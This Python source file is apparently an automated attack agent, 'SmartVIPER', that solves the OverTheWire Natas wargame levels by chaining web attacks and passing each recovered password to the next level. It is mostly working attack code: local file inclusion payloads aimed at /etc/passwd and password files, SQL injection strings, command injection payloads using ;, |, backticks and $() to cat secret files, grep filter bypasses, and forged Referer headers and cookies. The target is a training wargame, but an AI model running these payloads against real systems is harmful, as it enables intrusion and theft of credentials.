#!/usr/bin/env python3
"""
Smart VIPER - Uses learned capabilities
=======================================

VIPER that:
1. Tries standard attacks
2. Checks what it was taught for this level
3. Uses learned capabilities
4. Learns from new failures
"""

import json
import sys
from pathlib import Path
from datetime import datetime

sys.stdout.reconfigure(encoding='utf-8')

BASE = Path(__file__).parent.parent
sys.path.insert(0, str(BASE / 'core'))

from agentic_viper import AgenticVIPER, Tools, Memory

class SmartVIPER(AgenticVIPER):
    """VIPER that uses its training"""
    
    def __init__(self):
        super().__init__()
        self.training_path = BASE / "training"
        self.hints = self._load_hints()
        self.learned = self._load_learned()
    
    def _load_hints(self):
        hints_path = self.training_path / "level_hints.json"
        if hints_path.exists():
            return json.loads(hints_path.read_text())
        return {}
    
    def _load_learned(self):
        log_path = self.training_path / "teaching_log.json"
        if log_path.exists():
            return json.loads(log_path.read_text())
        return {"capabilities_taught": []}
    
    def get_level_from_url(self, url):
        """Extract level number from URL"""
        import re
        match = re.search(r'natas(\d+)', url)
        return int(match.group(1)) if match else -1
    
    def hack(self, url: str, goal: str = "find_password",
             auth: tuple = None, max_attempts: int = 30) -> dict:
        """Enhanced hack with learned capabilities"""
        
        level = self.get_level_from_url(url)
        self.log(f"TARGET: {url} (Level {level})")
        self.log(f"SESSION: #{self.memory.data['session_count']}")
        
        result = {
            "success": False,
            "password": None,
            "findings": [],
            "techniques_tried": [],
            "url": url,
            "level": level
        }
        
        # Phase 1: Initial recon
        self.log("PHASE 1: Reconnaissance", "PHASE")
        status, body, headers = Tools.http_get(url, auth=auth)
        
        if status == 0:
            self.log(f"Connection failed: {body}", "ERROR")
            return result
        
        self.log(f"Status: {status}, Size: {len(body)} bytes")
        
        # Check for password immediately
        pwd = Tools.extract_password(body, auth[1] if auth else "")
        if pwd:
            self.log(f"PASSWORD IN PAGE: {pwd}", "SUCCESS")
            result["success"] = True
            result["password"] = pwd
            return result
        
        # Phase 2: Check if we have hints for this level
        level_str = str(level)
        if level_str in self.hints:
            hint = self.hints[level_str]
            self.log(f"HINT AVAILABLE: {hint['technique']}", "LEARN")
            self.log(f"  {hint['hint']}", "LEARN")
        
        # Phase 3: Standard attacks
        self.log("PHASE 2: Standard Attacks", "PHASE")
        html_info = Tools.extract_from_html(body)
        
        # Try standard attacks first
        standard_result = self._standard_attacks(url, auth, body, html_info, result)
        if standard_result["success"]:
            return standard_result
        
        # Phase 4: Use learned capabilities based on level hints
        self.log("PHASE 3: Learned Capabilities", "PHASE")
        
        if level_str in self.hints:
            capability = self.hints[level_str].get("capability")
            if capability:
                self.log(f"Trying learned: {capability}", "LEARN")
                learned_result = self._use_learned_capability(
                    capability, url, auth, body, html_info, level
                )
                if learned_result.get("success"):
                    result["success"] = True
                    result["password"] = learned_result.get("password")
                    result["findings"].append({
                        "technique": f"learned:{capability}",
                        "details": learned_result
                    })
                    self.log(f"LEARNED CAPABILITY WORKED: {capability}", "SUCCESS")
                    return result
        
        # Phase 5: Try ALL learned capabilities
        self.log("PHASE 4: Trying All Learned", "PHASE")
        for cap in self.learned.get("capabilities_taught", []):
            if cap not in result["techniques_tried"]:
                self.log(f"Trying: {cap}")
                learned_result = self._use_learned_capability(
                    cap, url, auth, body, html_info, level
                )
                result["techniques_tried"].append(cap)
                if learned_result.get("success"):
                    result["success"] = True
                    result["password"] = learned_result.get("password")
                    return result
        
        self.log("PHASE 5: Complete - No password found", "PHASE")
        return result
    
    def _standard_attacks(self, url, auth, body, html_info, result):
        """Run standard attack suite"""
        
        # Check HTML comments (but validate password isn't just hex or current password)
        pwd = self._check_comments(body, auth)
        if pwd and not self._is_false_positive(pwd, auth):
            result["success"] = True
            result["password"] = pwd
            result["techniques_tried"].append("comments")
            return result
        result["techniques_tried"].append("comments")
        
        # Check source code
        pwd = self._check_source(url, auth)
        if pwd:
            result["success"] = True
            result["password"] = pwd
            result["techniques_tried"].append("source")
            return result
        result["techniques_tried"].append("source")
        
        # LFI if params exist
        if html_info.get("params"):
            pwd = self._try_lfi(url, auth, html_info["params"])
            if pwd:
                result["success"] = True
                result["password"] = pwd
                result["techniques_tried"].append("lfi")
                return result
        result["techniques_tried"].append("lfi")
        
        # SQLi if forms exist
        if html_info.get("forms"):
            pwd = self._try_sqli(url, auth, html_info["forms"][0])
            if pwd:
                result["success"] = True
                result["password"] = pwd
                result["techniques_tried"].append("sqli")
                return result
        result["techniques_tried"].append("sqli")
        
        return result
    
    def _check_comments(self, body, auth):
        """Check HTML comments for password"""
        import re
        comments = re.findall(r'<!--(.*?)-->', body, re.DOTALL)
        for c in comments:
            pwd = Tools.extract_password(c, auth[1] if auth else "")
            if pwd:
                return pwd
        return None
    
    def _is_false_positive(self, pwd, auth):
        """Check if password is a false positive"""
        import re
        # Reject if it's the current password
        if auth and pwd == auth[1]:
            return True
        # Reject if it looks like hex-only (encoding artifact)
        if re.match(r'^[0-9a-fA-F]+$', pwd) and len(pwd) == 32:
            return True
        # Reject common false positives
        if pwd in ['password', 'secret', 'admin']:
            return True
        return False
    
    def _check_source(self, url, auth):
        """Check for source code disclosure"""
        for path in ['index-source.html', 'source.php']:
            test_url = f"{url.rstrip('/')}/{path}"
            status, body, _ = Tools.http_get(test_url, auth=auth)
            if status == 200:
                pwd = Tools.extract_password(body, auth[1] if auth else "")
                if pwd:
                    return pwd
        return None
    
    def _try_lfi(self, url, auth, params):
        """Basic LFI attempts"""
        payloads = ["../../../etc/passwd", "....//....//etc/passwd"]
        for param in params[:2]:
            for payload in payloads:
                import urllib.parse
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                status, body, _ = Tools.http_get(test_url, auth=auth)
                if 'root:' in body:
                    pwd = Tools.extract_password(body, auth[1] if auth else "")
                    if pwd:
                        return pwd
        return None
    
    def _try_sqli(self, url, auth, form):
        """Basic SQLi attempts"""
        import urllib.parse
        action = urllib.parse.urljoin(url, form.get("action", ""))
        inputs = form.get("inputs", [])
        payloads = ["' OR '1'='1", "admin'--"]
        
        for payload in payloads:
            data = {i: payload for i in inputs}
            status, body, _ = Tools.http_post(action, data, auth=auth)
            pwd = Tools.extract_password(body, auth[1] if auth else "")
            if pwd:
                return pwd
        return None
    
    def _use_learned_capability(self, capability, url, auth, body, html_info, level):
        """Use a learned capability"""
        
        if capability == "directory_browse":
            return self._learned_directory_browse(url, auth, body, html_info)
        
        elif capability == "robots_follow":
            return self._learned_robots_follow(url, auth)
        
        elif capability == "header_spoof":
            return self._learned_header_spoof(url, auth, level)
        
        elif capability == "cookie_manipulate":
            return self._learned_cookie_manipulate(url, auth)
        
        elif capability == "source_include":
            return self._learned_source_include(url, auth, body)
        
        elif capability == "lfi_basic":
            return self._learned_lfi(url, auth, body)
        
        elif capability == "encoding_reverse":
            return self._learned_encoding_reverse(url, auth, body)
        
        elif capability == "cmdi_basic":
            return self._learned_cmdi(url, auth, body)
        
        elif capability == "cmdi_bypass":
            return self._learned_cmdi_bypass(url, auth, body)
        
        return {"success": False}
    
    def _learned_directory_browse(self, url, auth, body, html_info):
        """LEARNED: Browse directories found in HTML"""
        self.log("  Scanning for directories in HTML...")
        
        # Find paths that look like directories
        links = html_info.get("links", [])
        
        # Also check img src, script src, etc
        import re
        srcs = re.findall(r'src=["\']([^"\']+)["\']', body)
        hrefs = re.findall(r'href=["\']([^"\']+)["\']', body)
        all_paths = links + srcs + hrefs
        
        # Extract directory parts
        dirs = set()
        for path in all_paths:
            if '/' in path and not path.startswith('http'):
                parts = path.split('/')
                if len(parts) > 1:
                    dirs.add(parts[0])
        
        self.log(f"  Found potential directories: {dirs}")
        
        # Browse each directory
        for d in dirs:
            if not d or d.startswith('.') or d.startswith('#'):
                continue
            
            dir_url = f"{url.rstrip('/')}/{d}/"
            self.log(f"  Checking: {dir_url}")
            
            status, dir_body, _ = Tools.http_get(dir_url, auth=auth)
            
            if status == 200:
                # Check for directory listing
                if 'Index of' in dir_body or '<title>Index' in dir_body or '.txt' in dir_body:
                    self.log(f"  Directory listing found!")
                    
                    # Get all files
                    dir_links = Tools.extract_from_html(dir_body).get("links", [])
                    
                    for f in dir_links:
                        if f and not f.startswith('?') and f != '../':
                            file_url = f"{dir_url}{f}"
                            self.log(f"  Reading: {file_url}")
                            fs, fb, _ = Tools.http_get(file_url, auth=auth)
                            
                            if fs == 200:
                                pwd = Tools.extract_password(fb, auth[1] if auth else "")
                                if pwd:
                                    self.log(f"  PASSWORD FOUND: {pwd}", "SUCCESS")
                                    return {"success": True, "password": pwd, "file": f}
        
        return {"success": False}
    
    def _learned_robots_follow(self, url, auth):
        """LEARNED: Follow robots.txt paths"""
        self.log("  Checking robots.txt...")
        
        status, body, _ = Tools.http_get(f"{url}/robots.txt", auth=auth)
        
        if status != 200 or 'Disallow' not in body:
            return {"success": False}
        
        for line in body.split('\n'):
            if 'Disallow:' in line:
                path = line.split(':', 1)[1].strip()
                if path and path != '/':
                    full_url = f"{url.rstrip('/')}{path}"
                    self.log(f"  Following: {full_url}")
                    
                    s, b, _ = Tools.http_get(full_url, auth=auth)
                    if s == 200:
                        # Check for password
                        pwd = Tools.extract_password(b, auth[1] if auth else "")
                        if pwd:
                            return {"success": True, "password": pwd, "path": path}
                        
                        # Check subdirectory
                        if 'Index of' in b or '<a href' in b:
                            links = Tools.extract_from_html(b).get("links", [])
                            for link in links:
                                if link and not link.startswith('?'):
                                    link_url = f"{full_url.rstrip('/')}/{link}"
                                    ls, lb, _ = Tools.http_get(link_url, auth=auth)
                                    pwd = Tools.extract_password(lb, auth[1] if auth else "")
                                    if pwd:
                                        return {"success": True, "password": pwd, "file": link}
        
        return {"success": False}
    
    def _learned_header_spoof(self, url, auth, level):
        """LEARNED: Spoof HTTP headers"""
        self.log("  Trying header spoofing...")
        
        # First, read the page to see what it wants
        status, body, _ = Tools.http_get(url, auth=auth)
        
        # Look for hints about where we should come from
        import re
        
        # Pattern: "from natasX" or "authorized from"
        from_match = re.search(r'from["\s]+["\']?(http://natas\d+[^"\'<\s]*)', body, re.IGNORECASE)
        if from_match:
            target_referer = from_match.group(1)
            self.log(f"  Page wants referer: {target_referer}")
        else:
            # Try next level
            next_level = level + 1
            target_referer = url.replace(f"natas{level}", f"natas{next_level}")
        
        spoofs = [
            {"Referer": target_referer},
            {"Referer": target_referer + "/"},
            {"Referer": target_referer + "/index.html"},
        ]
        
        for headers in spoofs:
            self.log(f"  Headers: {headers}")
            status, body, _ = Tools.http_get(url, headers=headers, auth=auth)
            pwd = Tools.extract_password(body, auth[1] if auth else "")
            if pwd:
                return {"success": True, "password": pwd, "headers": headers}
            # Also check if we got access (not just password)
            if 'Access granted' in body or 'password is' in body.lower():
                pwd = Tools.extract_password(body, auth[1] if auth else "")
                if pwd:
                    return {"success": True, "password": pwd, "headers": headers}
        
        return {"success": False}
    
    def _learned_cookie_manipulate(self, url, auth):
        """LEARNED: Manipulate cookies"""
        self.log("  Trying cookie manipulation...")
        
        cookies = ["loggedin=1", "admin=1", "authenticated=true"]
        
        for cookie in cookies:
            headers = {"Cookie": cookie}
            status, body, _ = Tools.http_get(url, headers=headers, auth=auth)
            pwd = Tools.extract_password(body, auth[1] if auth else "")
            if pwd:
                return {"success": True, "password": pwd, "cookie": cookie}
        
        return {"success": False}
    
    def _learned_source_include(self, url, auth, body):
        """LEARNED: Find and read included source files"""
        self.log("  Looking for included files...")
        
        import re
        import html
        
        # Try index-source.html
        for src_path in ['index-source.html', 'index.php?source', '?source', '?view=source']:
            test_url = f"{url.rstrip('/')}/{src_path}" if not src_path.startswith('?') else f"{url}{src_path}"
            status, src_body, _ = Tools.http_get(test_url, auth=auth)
            if status == 200 and 'include' in src_body.lower():
                self.log(f"  Found source at {src_path}")
                
                # Decode HTML entities
                decoded = html.unescape(src_body)
                # Also try to extract from the HTML-formatted source
                # Pattern: include "path" or include&nbsp;"path"
                includes = re.findall(r'include\s*["\']([^"\']+)["\']', decoded)
                # Also try with HTML encoded quotes
                includes += re.findall(r'include[^"]*"([^"<>]+)"', src_body)
                # And from span content
                includes += re.findall(r'>include[^<]*</span>[^"]*"([^"]+)"', src_body)
                # Direct pattern from the colored source
                includes += re.findall(r'include.*?["\']([^"\'<>]+\.[a-z]+)["\']', src_body, re.IGNORECASE)
                
                includes = list(set(includes))
                self.log(f"  Includes found: {includes}")
                
                for inc in includes:
                    if not inc or inc.startswith('http'):
                        continue
                    self.log(f"  Reading include: {inc}")
                    inc_url = f"{url.rstrip('/')}/{inc}"
                    s, inc_body, _ = Tools.http_get(inc_url, auth=auth)
                    if s == 200:
                        self.log(f"  Include content: {inc_body[:200]}")
                        # Look for secrets/passwords in included file
                        secrets = re.findall(r'\$secret\s*=\s*["\']([^"\']+)["\']', inc_body)
                        if secrets:
                            secret = secrets[0]
                            self.log(f"  SECRET FOUND: {secret}", "SUCCESS")
                            # Submit the secret to get password
                            data = {"secret": secret, "submit": "1"}
                            s, resp, _ = Tools.http_post(url, data, auth=auth)
                            self.log(f"  Submit response: {resp[:200]}")
                            # Look for password in response - pattern: "password for natasX is Y"
                            pwd_match = re.search(r'password for natas\d+ is (\w+)', resp)
                            if pwd_match:
                                pwd = pwd_match.group(1)
                                self.log(f"  PASSWORD: {pwd}", "SUCCESS")
                                return {"success": True, "password": pwd, "secret": secret}
                            # Also try generic extract
                            pwd = Tools.extract_password(resp, auth[1] if auth else "")
                            if pwd and pwd != auth[1]:
                                return {"success": True, "password": pwd, "secret": secret}
        
        return {"success": False}
    
    def _learned_lfi(self, url, auth, body):
        """LEARNED: Local File Inclusion"""
        self.log("  Trying LFI...")
        
        import re
        import urllib.parse
        
        # Find parameters
        params = re.findall(r'[?&](\w+)=', body + url)
        links = Tools.extract_from_html(body).get("links", [])
        for link in links:
            params.extend(re.findall(r'[?&](\w+)=', link))
        
        params = list(set(params))
        if not params:
            params = ['page', 'file', 'include', 'path']
        
        payloads = [
            '/etc/natas_webpass/natas{next}',
            '....//....//....//etc/natas_webpass/natas{next}',
            '/etc/passwd',
        ]
        
        level = self.get_level_from_url(url)
        next_level = level + 1
        
        for param in params[:5]:
            for payload in payloads:
                test_payload = payload.format(next=next_level)
                test_url = f"{url}?{param}={urllib.parse.quote(test_payload)}"
                self.log(f"  LFI: {param}={test_payload[:30]}...")
                status, lfi_body, _ = Tools.http_get(test_url, auth=auth)
                
                pwd = Tools.extract_password(lfi_body, auth[1] if auth else "")
                if pwd:
                    return {"success": True, "password": pwd, "param": param, "payload": test_payload}
        
        return {"success": False}
    
    def _learned_encoding_reverse(self, url, auth, body):
        """LEARNED: Reverse encoding chains"""
        self.log("  Looking for encoded secrets...")
        
        import re
        import base64
        import binascii
        
        # First check source code for encodedSecret
        status, src_body, _ = Tools.http_get(f"{url}/index-source.html", auth=auth)
        
        # Look for encodedSecret pattern - handle HTML formatted source
        # First find encodedSecret, then look for hex near it
        if 'encodedSecret' in src_body:
            # Find any 32-char hex string in quotes (the encoded value)
            enc_match = re.search(r'"([0-9a-fA-F]{30,})"', src_body)
        else:
            enc_match = None
        
        if enc_match:
            hex_str = enc_match.group(1)
            self.log(f"  Found encodedSecret: {hex_str}")
            
            try:
                # Reverse: hex2bin -> strrev -> base64_decode
                decoded = binascii.unhexlify(hex_str)
                reversed_bytes = decoded[::-1]
                final = base64.b64decode(reversed_bytes).decode('utf-8')
                self.log(f"  Decoded secret: {final}", "SUCCESS")
                
                # Submit to form
                data = {"secret": final, "submit": "1"}
                s, resp, _ = Tools.http_post(url, data, auth=auth)
                
                pwd_match = re.search(r'password for natas\d+ is (\w+)', resp)
                if pwd_match:
                    pwd = pwd_match.group(1)
                    return {"success": True, "password": pwd, "decoded": final}
            except Exception as e:
                self.log(f"  Decode error: {e}")
        
        # Fallback: look for hex strings in main page
        hex_strings = re.findall(r'[0-9a-fA-F]{20,}', body)
        for hex_str in hex_strings:
            try:
                decoded = binascii.unhexlify(hex_str)
                reversed_bytes = decoded[::-1]
                final = base64.b64decode(reversed_bytes).decode('utf-8')
                if final and len(final) > 5:
                    data = {"secret": final, "submit": "1"}
                    s, resp, _ = Tools.http_post(url, data, auth=auth)
                    pwd_match = re.search(r'password for natas\d+ is (\w+)', resp)
                    if pwd_match:
                        return {"success": True, "password": pwd_match.group(1), "decoded": final}
            except:
                pass
        
        return {"success": False}
    
    def _learned_cmdi(self, url, auth, body):
        """LEARNED: Command injection"""
        self.log("  Trying command injection...")
        
        forms = Tools.extract_from_html(body).get("forms", [])
        if not forms:
            return {"success": False}
        
        level = self.get_level_from_url(url)
        next_level = level + 1
        target_file = f"/etc/natas_webpass/natas{next_level}"
        
        payloads = [
            f"; cat {target_file}",
            f"| cat {target_file}",
            f"`cat {target_file}`",
            f"$(cat {target_file})",
            f"; cat {target_file} #",
            f"x; cat {target_file}",
        ]
        
        form = forms[0]
        action = form.get("action", "")
        action_url = f"{url.rstrip('/')}/{action}" if action else url
        inputs = form.get("inputs", ["needle", "query", "cmd", "search"])
        
        for inp in inputs:
            for payload in payloads:
                self.log(f"  CMDi: {inp}={payload[:25]}...")
                data = {inp: payload, "submit": "Submit", "Search": "Search"}
                status, resp, _ = Tools.http_post(action_url, data, auth=auth)
                pwd = Tools.extract_password(resp, auth[1] if auth else "")
                if pwd:
                    return {"success": True, "password": pwd, "payload": payload}
        
        return {"success": False}
    
    def _learned_cmdi_bypass(self, url, auth, body):
        """LEARNED: Command injection with filter bypass"""
        self.log("  Trying CMDi bypass...")
        
        forms = Tools.extract_from_html(body).get("forms", [])
        if not forms:
            return {"success": False}
        
        level = self.get_level_from_url(url)
        next_level = level + 1
        target_file = f"/etc/natas_webpass/natas{next_level}"
        
        # Bypass payloads - avoid common filtered chars
        payloads = [
            f".* {target_file}",  # grep pattern to match anything
            f".*",  # very simple
            f"-v x {target_file}",  # grep -v
        ]
        
        form = forms[0]
        action = form.get("action", "")
        action_url = f"{url.rstrip('/')}/{action}" if action else url
        inputs = form.get("inputs", ["needle", "query"])
        
        for inp in inputs:
            for payload in payloads:
                self.log(f"  CMDi bypass: {inp}={payload}")
                data = {inp: payload, "submit": "Submit", "Search": "Search"}
                status, resp, _ = Tools.http_post(action_url, data, auth=auth)
                pwd = Tools.extract_password(resp, auth[1] if auth else "")
                if pwd:
                    return {"success": True, "password": pwd, "payload": payload}
        
        return {"success": False}


def run_smart():
    """Run SmartVIPER"""
    
    print("="*60)
    print("SMART VIPER - Uses Training")
    print("="*60)
    
    passwords = {0: "natas0"}
    current_level = 0
    max_level = 10
    
    while current_level <= max_level:
        if current_level not in passwords:
            break
        
        url = f"http://natas{current_level}.natas.labs.overthewire.org"
        auth = (f"natas{current_level}", passwords[current_level])
        
        print(f"\n{'='*60}")
        print(f"LEVEL {current_level}")
        print(f"{'='*60}")
        
        viper = SmartVIPER()
        result = viper.hack(url, auth=auth)
        
        if result["success"] and result.get("password"):
            print(f"\n[SOLVED] {result['password']}")
            passwords[current_level + 1] = result["password"]
            current_level += 1
        else:
            print(f"\n[STUCK] Level {current_level}")
            # Record for training
            failures_path = BASE / "memory" / "failures.json"
            if failures_path.exists():
                failures = json.loads(failures_path.read_text())
            else:
                failures = {"levels": {}}
            
            failures["levels"][str(current_level)] = {
                "level": current_level,
                "tried": result.get("techniques_tried", []),
                "timestamp": datetime.now().isoformat()
            }
            failures_path.write_text(json.dumps(failures, indent=2))
            break
    
    print(f"\n{'='*60}")
    print(f"RESULT: Solved {current_level} levels")
    print(f"{'='*60}")


if __name__ == "__main__":
    run_smart()
